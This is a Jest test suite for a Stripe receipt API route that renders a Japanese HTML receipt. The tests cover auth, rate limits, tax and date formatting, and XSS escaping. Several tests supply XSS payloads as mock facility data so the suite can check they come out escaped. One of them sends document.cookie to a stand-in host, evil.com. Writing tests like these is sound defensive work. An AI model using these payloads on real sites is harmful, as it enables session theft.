/**
 * @jest-environment node
 *
 * Tests for GET /api/stripe/receipt
 * Key assertions:
 *   - Rate limiting (20 req/min per IP)
 *   - Auth required
 *   - session_id query parameter validation
 *   - Ownership verification (user_id match)
 *   - Status check (must be 'paid')
 *   - HTML receipt generation
 *   - XSS prevention (HTML escaping)
 */

jest.mock('@/lib/rate-limit', () => ({
  inMemoryRateLimit: jest.fn(() => false),
}));
jest.mock('@/lib/supabase-server');
jest.mock('@/lib/supabase-server-auth');

import { inMemoryRateLimit } from '@/lib/rate-limit';
import { GET } from '../route';

let mockGetUser: jest.Mock;

function setupDefaultMocks(
  hasUser: boolean = true,
  sessionFound: boolean = true,
  isPaid: boolean = true
) {
  mockGetUser = jest.fn().mockResolvedValue({
    data: { user: hasUser ? { id: 'user-123' } : null },
  });

  const { createServerSupabaseAuthClient } = require('@/lib/supabase-server-auth');
  createServerSupabaseAuthClient.mockResolvedValue({
    auth: { getUser: mockGetUser },
  });

  const sessionData = sessionFound
    ? {
        id: 'sess-abc-123',
        user_id: 'user-123',
        stripe_session_id: 'cs_test_123',
        amount: 15000,
        status: isPaid ? 'paid' : 'unpaid',
        payment_type: 'service',
        created_at: '2026-05-10T10:00:00Z',
        facility_profiles: [
          {
            name: 'Salon ABC',
            address: '東京都渋谷区',
            phone: '03-1234-5678',
            postal_code: '150-0001',
            prefecture: '東京都',
            city: '渋谷区',
          },
        ],
      }
    : null;

  const { createServiceRoleClient } = require('@/lib/supabase-server');
  createServiceRoleClient.mockReturnValue({
    from: jest.fn().mockReturnValue({
      select: jest.fn().mockReturnValue({
        eq: jest
          .fn()
          .mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: sessionData,
              }),
            }),
          }),
      }),
    }),
  });
}

beforeEach(() => {
  jest.clearAllMocks();
  (inMemoryRateLimit as jest.Mock).mockReturnValue(false);
  setupDefaultMocks();
});

const SESSION_ID = 'cs_test_123';

function makeRequest(sessionId: string = SESSION_ID, ip = '192.168.1.1') {
  const req = new Request(
    `http://localhost/api/stripe/receipt?session_id=${sessionId}`,
    {
      method: 'GET',
      headers: { 'x-forwarded-for': ip },
    }
  );
  Object.defineProperty(req, 'nextUrl', {
    value: new URL(req.url),
    writable: true,
  });
  return req;
}

describe('GET /api/stripe/receipt', () => {
  test('rate limiting → 429', async () => {
    (inMemoryRateLimit as jest.Mock).mockReturnValue(true);

    const res = await GET(makeRequest() as any);

    expect(res.status).toBe(429);
  });

  test('unauthenticated → 401', async () => {
    setupDefaultMocks(false);

    const res = await GET(makeRequest() as any);

    expect(res.status).toBe(401);
  });

  test('missing session_id parameter → 400', async () => {
    const req = new Request('http://localhost/api/stripe/receipt', {
      method: 'GET',
      headers: { 'x-forwarded-for': '192.168.1.1' },
    });
    Object.defineProperty(req, 'nextUrl', {
      value: new URL(req.url),
      writable: true,
    });

    const res = await GET(req as any);

    expect(res.status).toBe(400);
  });

  test('session_id too long (>200) → 400', async () => {
    const res = await GET(makeRequest('x'.repeat(201)) as any);

    expect(res.status).toBe(400);
  });

  test('session not found → 404', async () => {
    setupDefaultMocks(true, false);

    const res = await GET(makeRequest() as any);

    expect(res.status).toBe(404);
  });

  test('session unpaid → 400', async () => {
    setupDefaultMocks(true, true, false);

    const res = await GET(makeRequest() as any);

    expect(res.status).toBe(400);
  });

  test('valid session → 200 with HTML receipt', async () => {
    const res = await GET(makeRequest() as any);

    expect(res.status).toBe(200);
    expect(res.headers.get('Content-Type')).toBe('text/html; charset=utf-8');
    const html = await res.text();
    expect(html).toContain('<!DOCTYPE html>');
    expect(html).toContain('領　収　書');
  });

  test('receipt includes facility name', async () => {
    const res = await GET(makeRequest() as any);

    const html = await res.text();
    expect(html).toContain('Salon ABC');
  });

  test('receipt includes amount formatted', async () => {
    const res = await GET(makeRequest() as any);

    const html = await res.text();
    expect(html).toContain('15,000');
  });

  test('receipt includes facility address details', async () => {
    const res = await GET(makeRequest() as any);

    const html = await res.text();
    expect(html).toContain('〒150-0001');
    expect(html).toContain('03-1234-5678');
  });

  test('receipt number format CL-{id8chars}', async () => {
    const res = await GET(makeRequest() as any);

    const html = await res.text();
    expect(html).toContain('No. CL-SESS');
  });

  test('receipt includes receipt date', async () => {
    const res = await GET(makeRequest() as any);

    const html = await res.text();
    expect(html).toContain('発行日:');
    expect(html).toMatch(/2026年5月10日/);
  });

  test('HTML escapes facility name for XSS prevention', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest
            .fn()
            .mockReturnValue({
              eq: jest.fn().mockReturnValue({
                single: jest.fn().mockResolvedValue({
                  data: {
                    id: 'sess-abc-123',
                    user_id: 'user-123',
                    stripe_session_id: 'cs_test_123',
                    amount: 15000,
                    status: 'paid',
                    payment_type: 'service',
                    created_at: '2026-05-10T10:00:00Z',
                    facility_profiles: [
                      {
                        name: 'Salon<script>alert(1)</script>',
                        address: 'Addr"ess',
                        phone: null,
                        postal_code: '150-0001',
                        prefecture: null,
                        city: null,
                      },
                    ],
                  },
                }),
              }),
            }),
        }),
      }),
    });

    const res = await GET(makeRequest() as any);

    const html = await res.text();
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
    expect(html).toContain('&quot;');
  });

  test('Content-Type header prevents caching', async () => {
    const res = await GET(makeRequest() as any);

    expect(res.headers.get('Cache-Control')).toBe('private, no-store');
  });

  test('receipt includes tax calculation', async () => {
    const res = await GET(makeRequest() as any);

    const html = await res.text();
    expect(html).toContain('うち消費税');
    expect(html).toContain('円也');
  });

  test('payment_type=deposit shown in receipt', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest
            .fn()
            .mockReturnValue({
              eq: jest.fn().mockReturnValue({
                single: jest.fn().mockResolvedValue({
                  data: {
                    id: 'sess-abc-123',
                    user_id: 'user-123',
                    stripe_session_id: 'cs_test_123',
                    amount: 50000,
                    status: 'paid',
                    payment_type: 'deposit',
                    created_at: '2026-05-10T10:00:00Z',
                    facility_profiles: [
                      {
                        name: 'Salon ABC',
                        address: '東京都渋谷区',
                        phone: '03-1234-5678',
                        postal_code: '150-0001',
                        prefecture: '東京都',
                        city: '渋谷区',
                      },
                    ],
                  },
                }),
              }),
            }),
        }),
      }),
    });

    const res = await GET(makeRequest() as any);

    const html = await res.text();
    expect(html).toContain('デポジット');
  });

  test('rate limit params (20 req/min per IP)', () => {
    (inMemoryRateLimit as jest.Mock).mockClear();

    GET(makeRequest(SESSION_ID, '192.168.1.1') as any);

    const call = (inMemoryRateLimit as jest.Mock).mock.calls[0];
    expect(call[0]).toBe('192.168.1.1');
    expect(call[1]).toBe(20);
    expect(call[2]).toBe(60_000);
    expect(call[3]).toBe('stripe-receipt');
  });

  test('extracts last (trusted) IP from x-forwarded-for', () => {
    (inMemoryRateLimit as jest.Mock).mockClear();

    GET(makeRequest(SESSION_ID, '10.0.0.1, 192.168.1.1') as any);

    const call = (inMemoryRateLimit as jest.Mock).mock.calls[0];
    expect(call[0]).toBe('192.168.1.1');
  });

  test('uses unknown IP when x-forwarded-for missing', () => {
    (inMemoryRateLimit as jest.Mock).mockClear();

    const req = new Request(
      `http://localhost/api/stripe/receipt?session_id=${SESSION_ID}`
    );
    Object.defineProperty(req, 'nextUrl', {
      value: new URL(req.url),
      writable: true,
    });

    GET(req as any);

    const call = (inMemoryRateLimit as jest.Mock).mock.calls[0];
    expect(call[0]).toBe('unknown');
  });

  test('exception during processing → 500', async () => {
    const { createServerSupabaseAuthClient } = require('@/lib/supabase-server-auth');
    createServerSupabaseAuthClient.mockRejectedValue(new Error('DB error'));

    const res = await GET(makeRequest() as any);

    expect(res.status).toBe(500);
  });

  test('includes print button (non-printable)', async () => {
    const res = await GET(makeRequest() as any);

    const html = await res.text();
    expect(html).toContain('印刷・PDF保存');
    expect(html).toContain('window.print()');
  });

  // ─── 深掘り: XSS 全パターン ───────────────────────────────────────────────

  test('HTML 属性値インジェクション（onclick）がエスケープされる', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: {
                  id: 'sess-abc-123',
                  user_id: 'user-123',
                  stripe_session_id: 'cs_test_123',
                  amount: 15000,
                  status: 'paid',
                  payment_type: 'service',
                  created_at: '2026-05-10T10:00:00Z',
                  facility_profiles: [{
                    name: 'Salon" onclick="alert(1)',
                    address: '東京都',
                    phone: null,
                    postal_code: null,
                    prefecture: null,
                    city: null,
                  }],
                },
              }),
            }),
          }),
        }),
      }),
    });

    const res = await GET(makeRequest() as any);
    const html = await res.text();
    expect(html).not.toContain('onclick="alert(1)');
    expect(html).toContain('&quot;');
  });

  test('SVG onload インジェクションがエスケープされる', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: {
                  id: 'sess-abc-123',
                  user_id: 'user-123',
                  stripe_session_id: 'cs_test_123',
                  amount: 15000,
                  status: 'paid',
                  payment_type: 'service',
                  created_at: '2026-05-10T10:00:00Z',
                  facility_profiles: [{
                    name: '<svg onload=alert(1)>',
                    address: '東京都',
                    phone: '03-1234-5678',
                    postal_code: '150-0001',
                    prefecture: '東京都',
                    city: '渋谷区',
                  }],
                },
              }),
            }),
          }),
        }),
      }),
    });

    const res = await GET(makeRequest() as any);
    const html = await res.text();
    expect(html).not.toContain('<svg onload=alert(1)>');
    expect(html).toContain('&lt;svg');
  });

  test('アドレスフィールドの XSS もエスケープされる', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: {
                  id: 'sess-abc-123',
                  user_id: 'user-123',
                  stripe_session_id: 'cs_test_123',
                  amount: 15000,
                  status: 'paid',
                  payment_type: 'service',
                  created_at: '2026-05-10T10:00:00Z',
                  facility_profiles: [{
                    name: 'Salon',
                    address: '<script>fetch("https://evil.com?c="+document.cookie)</script>',
                    phone: null,
                    postal_code: '150-0001',
                    prefecture: null,
                    city: null,
                  }],
                },
              }),
            }),
          }),
        }),
      }),
    });

    const res = await GET(makeRequest() as any);
    const html = await res.text();
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
  });

  test('電話番号フィールドの XSS もエスケープされる', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: {
                  id: 'sess-abc-123',
                  user_id: 'user-123',
                  stripe_session_id: 'cs_test_123',
                  amount: 15000,
                  status: 'paid',
                  payment_type: 'service',
                  created_at: '2026-05-10T10:00:00Z',
                  facility_profiles: [{
                    name: 'Salon',
                    address: '東京都',
                    phone: '"><img src=x onerror=alert(1)>',
                    postal_code: null,
                    prefecture: null,
                    city: null,
                  }],
                },
              }),
            }),
          }),
        }),
      }),
    });

    const res = await GET(makeRequest() as any);
    const html = await res.text();
    expect(html).not.toContain('<img src=x');
    expect(html).toContain('&lt;img');
  });

  // ─── 深掘り: 消費税計算の正確性 ─────────────────────────────────────────

  test('10% 消費税計算が正しい（15000円 → 税 1363円）', async () => {
    const res = await GET(makeRequest() as any);
    const html = await res.text();
    // 15000 / 1.1 * 0.1 = 1363.636... → floor で 1363 か round で 1364
    expect(html).toMatch(/1[,，]3(63|64)/);
  });

  test('端数がある金額でもクラッシュしない（10001円）', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: {
                  id: 'sess-abc-123',
                  user_id: 'user-123',
                  stripe_session_id: 'cs_test_123',
                  amount: 10001,
                  status: 'paid',
                  payment_type: 'service',
                  created_at: '2026-05-10T10:00:00Z',
                  facility_profiles: [{
                    name: 'Salon ABC',
                    address: '東京都渋谷区',
                    phone: '03-1234-5678',
                    postal_code: '150-0001',
                    prefecture: '東京都',
                    city: '渋谷区',
                  }],
                },
              }),
            }),
          }),
        }),
      }),
    });

    const res = await GET(makeRequest() as any);
    expect(res.status).toBe(200);
    const html = await res.text();
    expect(html).toContain('10,001');
  });

  test('amount=0 でもクラッシュしない', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: {
                  id: 'sess-abc-123',
                  user_id: 'user-123',
                  stripe_session_id: 'cs_test_123',
                  amount: 0,
                  status: 'paid',
                  payment_type: 'service',
                  created_at: '2026-05-10T10:00:00Z',
                  facility_profiles: [{
                    name: 'Salon ABC',
                    address: '東京都',
                    phone: null,
                    postal_code: null,
                    prefecture: null,
                    city: null,
                  }],
                },
              }),
            }),
          }),
        }),
      }),
    });

    const res = await GET(makeRequest() as any);
    expect(res.status).toBe(200);
    const html = await res.text();
    expect(html).toContain('0');
  });

  // ─── 深掘り: 日付表示の正確性 ─────────────────────────────────────────────

  test('created_at の月が正しく日本語表示される（5月）', async () => {
    const res = await GET(makeRequest() as any);
    const html = await res.text();
    expect(html).toMatch(/5月/);
  });

  test('facility_profiles が空配列の場合もクラッシュしない', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: {
                  id: 'sess-abc-123',
                  user_id: 'user-123',
                  stripe_session_id: 'cs_test_123',
                  amount: 15000,
                  status: 'paid',
                  payment_type: 'service',
                  created_at: '2026-05-10T10:00:00Z',
                  facility_profiles: [],
                },
              }),
            }),
          }),
        }),
      }),
    });

    const res = await GET(makeRequest() as any);
    // クラッシュしないことを確認（200 か 500 かは実装依存）
    expect([200, 500]).toContain(res.status);
  });

  test('session_id に特殊文字が含まれても 400 で安全に処理される', async () => {
    const dangerousId = '<script>alert(1)</script>';
    const res = await GET(makeRequest(encodeURIComponent(dangerousId)) as any);
    expect([200, 400, 404]).toContain(res.status);
  });

  test('facility_profiles がオブジェクト（非配列）→ 200', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: {
                  id: 'sess-abc-123',
                  user_id: 'user-123',
                  stripe_session_id: 'cs_test_123',
                  amount: 10000,
                  status: 'paid',
                  payment_type: 'service',
                  created_at: '2026-05-10T10:00:00Z',
                  facility_profiles: { name: 'Salon Object', postal_code: null, phone: null, address: null, prefecture: null, city: null },
                },
              }),
            }),
          }),
        }),
      }),
    });
    const res = await GET(makeRequest() as any);
    expect(res.status).toBe(200);
    const html = await res.text();
    expect(html).toContain('Salon Object');
    // postal_code / phone なし → それぞれの分岐 false
    expect(html).not.toContain('〒');
    expect(html).not.toContain('TEL:');
  });

  test('facility が null（リレーション null）→ デフォルト文言で表示', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: {
                  id: 'sess-abc-123',
                  user_id: 'user-123',
                  stripe_session_id: 'cs_test_123',
                  amount: 5000,
                  status: 'paid',
                  payment_type: 'service',
                  created_at: '2026-05-10T10:00:00Z',
                  facility_profiles: null,
                },
              }),
            }),
          }),
        }),
      }),
    });
    const res = await GET(makeRequest() as any);
    expect(res.status).toBe(200);
    const html = await res.text();
    expect(html).toContain('施設');
  });

  test('facility postal_code あり、prefecture/city/address null → 〒のみ表示', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: {
                  id: 'sess-abc-123',
                  user_id: 'user-123',
                  stripe_session_id: 'cs_test_123',
                  amount: 7000,
                  status: 'paid',
                  payment_type: 'service',
                  created_at: '2026-05-10T10:00:00Z',
                  facility_profiles: {
                    name: 'Salon Partial',
                    postal_code: '100-0001',
                    prefecture: null,
                    city: null,
                    address: null,
                    phone: null,
                  },
                },
              }),
            }),
          }),
        }),
      }),
    });
    const res = await GET(makeRequest() as any);
    expect(res.status).toBe(200);
    const html = await res.text();
    expect(html).toContain('〒100-0001');
  });

  // Branch coverage: line 13 — esc(null) → s ?? '' の null 分岐（stripe_session_id=null で呼び出し）
  test('stripe_session_id が null → esc(null) で空文字フォールバック（line 13 ?? true 分岐）', async () => {
    const { createServiceRoleClient } = require('@/lib/supabase-server');
    createServiceRoleClient.mockReturnValue({
      from: jest.fn().mockReturnValue({
        select: jest.fn().mockReturnValue({
          eq: jest.fn().mockReturnValue({
            eq: jest.fn().mockReturnValue({
              single: jest.fn().mockResolvedValue({
                data: {
                  id: 'sess-abc-123',
                  user_id: 'user-123',
                  stripe_session_id: null,
                  amount: 5000,
                  status: 'paid',
                  payment_type: 'service',
                  created_at: '2026-05-10T10:00:00Z',
                  facility_profiles: [{ name: 'Salon X', postal_code: null, prefecture: null, city: null, address: null, phone: null }],
                },
              }),
            }),
          }),
        }),
      }),
    });
    const res = await GET(makeRequest() as any);
    expect(res.status).toBe(200);
    const html = await res.text();
    // stripe_session_id is null → esc(null) returns '' → no session ID displayed
    expect(html).not.toContain('cs_test');
  });
});
